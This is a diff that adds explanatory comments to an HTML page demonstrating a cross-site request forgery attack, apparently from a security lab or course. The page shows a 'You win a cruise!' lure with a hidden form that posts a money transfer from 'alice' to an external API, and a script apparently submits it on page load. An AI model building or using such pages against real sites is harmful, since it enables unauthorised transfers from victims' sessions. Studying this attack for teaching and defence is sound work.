@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <body>
+    <!-- This page just contains a hidden form element and a message indicating that the user won a cruise -->
     <h1>You win a cruise!</h1>
     <form action="http://www2.pr.iva.cy/api/transfer" method="post" id="attackform">
         <input type="hidden" name="from" value="alice" />
@@ -7,5 +8,6 @@
         <input type="hidden" name="amount" value="100" />
         <input type="submit" value="Claim Now" />
     </form>
+    <!-- The javascript in index.js will trigger a form submit on load -->
     <script src="index.js"></script>
 </body>
